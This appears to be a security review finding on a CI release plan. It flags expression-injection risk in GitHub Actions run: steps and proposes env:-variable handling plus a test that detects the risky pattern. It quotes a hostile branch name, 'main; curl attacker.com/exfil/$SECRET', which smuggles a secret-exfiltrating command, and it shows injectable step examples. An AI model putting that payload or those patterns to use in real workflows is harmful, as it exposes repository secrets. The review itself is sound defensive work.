---
finding_id: R2-F04
severity: medium
change_type: correctness
referenced_files: [docs/qrspi/2026-05-17-v07-release/plan.md:L506-L516, docs/qrspi/2026-05-17-v07-release/plan.md:L640-L651]
artifact: plan
round: 2
reviewer: security-claude
---

T14's CI workflow description uses `${{ github.ref }}` as the concurrency key and the plan's T19 test expectations assert structural shape and SHA-pinning of third-party actions, but neither T14 nor T19 requires that dynamic GitHub context values (such as `github.ref`, `github.head_ref`, `github.event.pull_request.title`) be passed through `env:` variables when used inside `run:` shell steps — leaving the workflow open to expression-injection attacks from attacker-controlled branch names or pull-request metadata.

T14 description states: "The `concurrency:` block is keyed on `github.ref` with `cancel-in-progress: true`." Using `${{ github.ref }}` as the concurrency group value is safe because the concurrency key is a string field, not a shell command. However, the plan does not state that NO dynamic GitHub context values are interpolated directly into `run:` step shell commands via `${{ expression }}` syntax. If an implementer writes a step like `run: echo "Testing branch ${{ github.ref }}"` or `run: git log --oneline ${{ github.event.pull_request.head.sha }}`, a fork with a branch named `main; curl attacker.com/exfil/$SECRET` can achieve remote code execution in the CI runner, with access to repository secrets.

T19 (`test-ci-workflow-shape.bats`) test expectations require: valid YAML parse, two jobs, SHA-pinned third-party actions, correct trigger families, correct concurrency key. None of these assertions catches expression-injection in `run:` steps. The ban-list grep in T14's `lint` job also does not include any check for `${{ github.*` interpolation patterns inside `run:` blocks.

This is a CI supply-chain security gap. GitHub's official hardening guidance (and the GitHub Security Lab advisory) classify direct use of `${{ github.event.* }}` in `run:` steps as injection vectors. The existing T19 SHA-pinning requirement correctly addresses action version pinning; expression injection is the complementary hardening requirement that is missing.

Required fix: Add to T14's description: "All GitHub Actions context values that contain user-controlled data (`github.ref`, `github.head_ref`, `github.event.pull_request.title`, `github.event.pull_request.body`, and any `github.event.pull_request.*` field) MUST NOT be interpolated directly into `run:` step shell commands via `${{ expression }}` syntax; they MUST be assigned to an `env:` block variable at the job or step level and referenced as `$ENV_VAR` inside the shell command." Add to T19's test expectations: "`test-ci-workflow-shape.bats` asserts that no `run:` step in the workflow contains a direct `${{ github.event.` or `${{ github.head_ref` interpolation (the literal characters `${{` followed by `github.event.` or `github.head_ref`) inside the step body's shell commands."
